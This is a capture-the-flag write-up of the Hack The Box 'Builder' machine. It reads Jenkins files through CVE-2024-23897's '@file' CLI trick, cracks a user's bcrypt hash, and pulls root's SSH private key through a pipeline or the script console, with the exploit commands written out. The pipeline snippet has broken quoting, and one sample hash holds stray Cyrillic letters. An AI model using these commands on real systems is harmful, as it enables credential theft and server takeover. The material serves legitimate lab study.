---
title: Builder
date: 2026-09-25
description: Medium Linux box reading Jenkins files through CVE-2024-23897's @file expansion, cracking jennifer's bcrypt hash, and pulling the root SSH key from a pipeline or the script console.
tags:
  - htb
  - Medium
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Fri Sep 25 08:12:46 2026 as: /usr/lib/nmap/nmap -p22,8080 -A -oN scan_results.txt 10.129.230.220
Nmap scan report for builder.htb (10.129.230.220)
Host is up (0.87s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(10.0.18)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   46.10 ms  10.10.16.1
2   676.15 ms builder.htb (10.129.230.220)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 25 08:13:44 2026 -- 1 IP address (1 host up) scanned in 58.75 seconds
```

> `Jenkins v 2.441` running on port 8080

> CVE-2024-23897:
> - https://pentest-tools.com/vulnerabilities-exploits/jenkins-2441-arbitrary-file-read_23018
> - https://github.com/P4x1s/CVE-2024-23897

Analyzing the POC, "**@**" causes the Jenkins command line interface (CLI) to load the contents of that file.

- We got the jar file from the **2nd poc** (1st poc didn't give proper results):

```sh
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/etc/passwd"
```

It fetches just the 1st line.

- Check the `/proc/self/environ` file to see information about the current process:

```sh
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/proc/self/environ"
```

```output
HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Arrange the output in order:

```
HOSTNAME=0f52c222a4cc
JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental
JAVA_HOME=/opt/java/openjdk
JENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementals
COPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.log
PWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441
HOME=/var/jenkins_home
LANG=C.UTF-8JENKINS_UC=https://updates.jenkins.io
SHLVL=0
JENKINS_HOME=/var/jenkins_home
REF=/usr/share/jenkins/ref
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

```

- Home directory -> `/var/jenkins_home`
- The hostname seems odd — if it were the actual builder machine it might be `builder.htb`
- The random strings suggest a docker container

With this vulnerability we can only read files — to understand the application, install it and explore.

Install **jenkins version 2.441** on a docker container:

```sh
docker pull jenkins/jenkins:2.441-jdk17
```

```sh
docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:2.441-jdk17 
```

- Paste the admin password
- Go with **select plugins to install** for faster installation
- Create a user if you want

Once installed, quit the hosting with ctrl+c:
- now open start and open the docker image in a bash shell:

```sh
docker ps -a
```

 - Lists all the dockers, even exited ones

```sh
docker start <container_id>
```

```sh
docker exec -it <container_id> bash
```

- In the home directory there is a directory called users
- Inside that directory there are two files:
	- `admin_RandomString` -> User directory of admin
	- `users.xml` -> holds the **name** of the **user** directory

- Inside the User directory there is a **config.xml** file which holds the password hash of the user:

```
<?xml version='1.1' encoding='UTF-8'?>
<user>
<version>10</version>
<id>admin</id>
<fullName>admin</fullName>
<properties>

...<SNIP>...

<passwordHash>#jbcrypt:$2a$10$qK5G66JbMWp04ipzlPMаЗеB97pSCcWwZKwDQo0s81fWmydcFgmMOe</passwordHash>

</hudson.security.HudsonPrivateSecurityRealm_-Details>
```

> **Info** : Can read the **username** and the **config** file inside that user directory to gain the **password hash**

# User

```sh
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/var/jenkins_home/users/users.xml"
```

It only fetched the 1st line. To fetch the whole content we can use **connect-node** which checks all the strings:

```sh
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' connect-node "@/var/jenkins_home/users/users.xml"
```

Got the user name `jennifer_12108429903186576833`:

```sh
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
```

Got the hash — cracked with hashcat (bcrypt hashes are usually hard to crack):

```sh
hashcat -m 3200 jenniferhash /usr/share/wordlists/rockyou.txt
```

> `jennifer - princess`

# Root

Login to **jenkins** using the creds.

Two ways for PrivEsc:
- To steal the key using the ssh key authorization **plugin** in pipelines
- To steal the key using the developer tools

### Method 1:
- Navigate to credentials

There's a **root** user's **ssh private key** stored.

If you check the **installed plugins**, the **SSH agent plugin** on Builder allows using SSH keys in **pipelines**.

Execution:
- Create a new pipeline
- In "**advance project options**" use the code to extract the key:

```sh
pipeline {
    agent any
    
    stages {
        stage('SSH') {
            steps {
                script {
                    sshagent(['credentials: ['1']']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@10.129.230.220 "cat /root/.ssh/id_rsa"'
                    }
                }
            }
        }
    }
}

```

Jenkins pipeline script (**Groovy syntax**). What it does:
- `pipeline` – Declares a declarative pipeline
- `agent any` – Runs on any available agent
- `stages` – Defines the pipeline stages
- `stage('SSH')` – Names this stage "SSH"
- `steps` – Contains the actions for this stage
- `script` – Allows arbitrary Groovy code
- `sshagent` – Uses the Jenkins credentials plugin to manage SSH keys securely
- `sh` – Executes a shell command that SSHes into a remote server and reads the private key file

Check the **console output** once you run the pipeline.

### Method 2:

Navigate to the key profile of the user root.

Use developer tools to find the hidden parameter `_.privateKey`.

The key is encrypted — check the **jenkins documentation** to find the encryption method:
> https://www.jenkins.io/doc/developer/security/secrets/

It uses **hudson.util.Secret** to encrypt the key.

Navigate to script console:

```
println(hudson.util.Secret.decrypt("{AQAAABAAAAowl...}"))
```

Gained `root`
